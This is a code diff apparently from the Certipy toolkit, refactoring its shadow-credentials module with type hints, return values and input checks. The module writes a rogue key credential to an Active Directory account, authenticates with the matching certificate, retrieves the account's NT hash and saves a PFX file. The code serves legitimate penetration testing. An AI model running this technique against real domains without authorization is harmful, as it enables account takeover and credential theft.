@@ -3,13 +3,14 @@ from typing import List, Tuple
 
 import ldap3
 import OpenSSL
+from cryptography.hazmat.primitives.asymmetric.types import PrivateKeyTypes
 from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.common.data.DNWithBinary import DNWithBinary
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 from dsinternals.system.DateTime import DateTime
 from dsinternals.system.Guid import Guid
 
-from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, rsa, x509
+from certipy.lib.certificate import create_pfx, der_to_cert, der_to_key, x509
 from certipy.lib.ldap import LDAPConnection, LDAPEntry
 from certipy.lib.logger import logging
 from certipy.lib.target import Target
@@ -22,10 +23,10 @@ class Shadow:
         self,
         target: Target,
         account: str,
-        device_id: str = None,
-        out: str = None,
+        device_id: str | None = None,
+        out: str | None = None,
         scheme: str = "ldaps",
-        connection: LDAPConnection = None,
+        connection: LDAPConnection | None = None,
         debug=False,
         **kwargs
     ):
@@ -49,7 +50,9 @@ class Shadow:
 
         return self._connection
 
-    def get_key_credentials(self, target_dn: str, user: LDAPEntry) -> List[bytes]:
+    def get_key_credentials(
+        self, target_dn: str, user: LDAPEntry
+    ) -> List[bytes] | None:
         results = self.connection.search(
             search_base=target_dn,
             search_filter="(objectClass=*)",
@@ -128,7 +131,7 @@ class Shadow:
 
     def add_new_key_credential(
         self, target_dn: str, user: LDAPEntry
-    ) -> Tuple[X509Certificate2, KeyCredential, List[bytes], str]:
+    ) -> Tuple[X509Certificate2, List[bytes], List[bytes], str] | None:
         cert, key_credential, device_id = self.generate_key_credential(
             target_dn, "%s" % user.get("sAMAccountName")
         )
@@ -143,7 +146,7 @@ class Shadow:
             return None
 
         new_key_credential = saved_key_credential + [
-            key_credential.toDNWithBinary().toString()
+            key_credential.toDNWithBinary().BinaryData
         ]
 
         logging.info(
@@ -164,20 +167,21 @@ class Shadow:
         return (cert, new_key_credential, saved_key_credential, device_id)
 
     def get_key_and_certificate(
-        self, cert: X509Certificate2
-    ) -> Tuple[rsa.RSAPrivateKey, x509.Certificate]:
+        self, cert2: X509Certificate2
+    ) -> Tuple[PrivateKeyTypes, x509.Certificate]:
         key = der_to_key(
-            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert.key)
+            OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert2.key)  # type: ignore
         )
+
         cert = der_to_cert(
             OpenSSL.crypto.dump_certificate(
-                OpenSSL.crypto.FILETYPE_ASN1, cert.certificate
+                OpenSSL.crypto.FILETYPE_ASN1, cert2.certificate
             )
         )
 
         return (key, cert)
 
-    def auto(self):
+    def auto(self) -> bool | str | None:
         user = self.connection.get_user(self.account)
         if user is None:
             return False
@@ -185,6 +189,12 @@ class Shadow:
         logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))
 
         target_dn = user.get("distinguishedName")
+
+        if not isinstance(target_dn, str):
+            logging.error(
+                "Target DN is not a string. Cannot proceed with the operation."
+            )
+            return False
 
         result = self.add_new_key_credential(target_dn, user)
         if result is None:
@@ -200,8 +210,14 @@ class Shadow:
         )
 
         authenticate = Authenticate(self.target, cert=cert, key=key)
-        authenticate.authenticate(
-            username=user.get("sAMAccountName"),
+
+        sam_account_name = user.get("sAMAccountName")
+
+        if isinstance(sam_account_name, list):
+            sam_account_name = sam_account_name[0]
+
+        _ = authenticate.authenticate(
+            username=sam_account_name,
             is_key_credential=True,
             domain=self.connection.domain,
         )
@@ -226,7 +242,7 @@ class Shadow:
 
         return authenticate.nt_hash
 
-    def add(self):
+    def add(self) -> bool:
         user = self.connection.get_user(self.account)
         if user is None:
             return False
@@ -234,27 +250,44 @@ class Shadow:
         logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))
 
         target_dn = user.get("distinguishedName")
+
+        if not isinstance(target_dn, str):
+            logging.error(
+                "Target DN is not a string. Cannot proceed with the operation."
+            )
+            return False
 
         result = self.add_new_key_credential(target_dn, user)
         if result is None:
             return False
 
-        cert, _, _, device_id = result
+        cert, _, _, _ = result
 
         key, cert = self.get_key_and_certificate(cert)
 
         out = self.out
         if out is None:
-            out = "%s.pfx" % user.get("sAMAccountName").rstrip("$")
+            sam_account_name = user.get("sAMAccountName")
+            if isinstance(sam_account_name, list):
+                sam_account_name = sam_account_name[0]
+
+            if sam_account_name is None:
+                sam_account_name = "user_%s" % target_dn.split(",")[0].replace(
+                    "\\", "_"
+                ).replace("/", "_")
+
+            out = "%s.pfx" % sam_account_name.rstrip("$")
 
         pfx = create_pfx(key, cert)
 
         with open(out, "wb") as f:
-            f.write(pfx)
+            _ = f.write(pfx)
 
         logging.info("Saved certificate and private key to %s" % repr(out))
 
-    def list(self):
+        return True
+
+    def list(self) -> bool:
         user = self.connection.get_user(self.account)
         if user is None:
             return False
@@ -262,6 +295,12 @@ class Shadow:
         logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))
 
         target_dn = user.get("distinguishedName")
+
+        if not isinstance(target_dn, str):
+            logging.error(
+                "Target DN is not a string. Cannot proceed with the operation."
+            )
+            return False
 
         key_credentials = self.get_key_credentials(target_dn, user)
         if key_credentials is None:
@@ -272,7 +311,7 @@ class Shadow:
                 "The Key Credentials attribute for %s is either empty or the current user does not have read permissions for the attribute"
                 % repr(user.get("sAMAccountName"))
             )
-            return True
+            return False
 
         logging.info(
             "Listing Key Credentials for %s" % repr(user.get("sAMAccountName"))
@@ -290,7 +329,9 @@ class Shadow:
                 )
             )
 
-    def clear(self):
+        return True
+
+    def clear(self) -> bool:
         user = self.connection.get_user(self.account)
         if user is None:
             return False
@@ -298,6 +339,12 @@ class Shadow:
         logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))
 
         target_dn = user.get("distinguishedName")
+
+        if not isinstance(target_dn, str):
+            logging.error(
+                "Target DN is not a string. Cannot proceed with the operation."
+            )
+            return False
 
         logging.info(
             "Clearing the Key Credentials for %s" % repr(user.get("sAMAccountName"))
@@ -313,7 +360,7 @@ class Shadow:
 
         return result
 
-    def remove(self):
+    def remove(self) -> bool:
         if self.device_id is None:
             logging.error(
                 "A device ID (-device-id) is required for the remove operation"
@@ -327,6 +374,12 @@ class Shadow:
         logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))
 
         target_dn = user.get("distinguishedName")
+
+        if not isinstance(target_dn, str):
+            logging.error(
+                "Target DN is not a string. Cannot proceed with the operation."
+            )
+            return False
 
         key_credentials = self.get_key_credentials(target_dn, user)
         if key_credentials is None:
@@ -376,7 +429,7 @@ class Shadow:
             )
             return False
 
-    def info(self):
+    def info(self) -> bool:
         if self.device_id is None:
             logging.error("A device ID (-device-id) is required for the info operation")
             return False
@@ -388,6 +441,12 @@ class Shadow:
         logging.info("Targeting user %s" % repr(user.get("sAMAccountName")))
 
         target_dn = user.get("distinguishedName")
+
+        if not isinstance(target_dn, str):
+            logging.error(
+                "Target DN is not a string. Cannot proceed with the operation."
+            )
+            return False
 
         key_credentials = self.get_key_credentials(target_dn, user)
         if key_credentials is None:
@@ -428,8 +487,13 @@ def entry(options: argparse.Namespace) -> None:
     if account is None:
         account = target.username
 
-    del options.account
-    del options.target
+    if account is None:
+        logging.error("An account (-account) is required")
+        return
+
+    options.__delattr__("account")
+    options.__delattr__("target")
+
     shadow = Shadow(target=target, account=account, **vars(options))
 
     actions = {
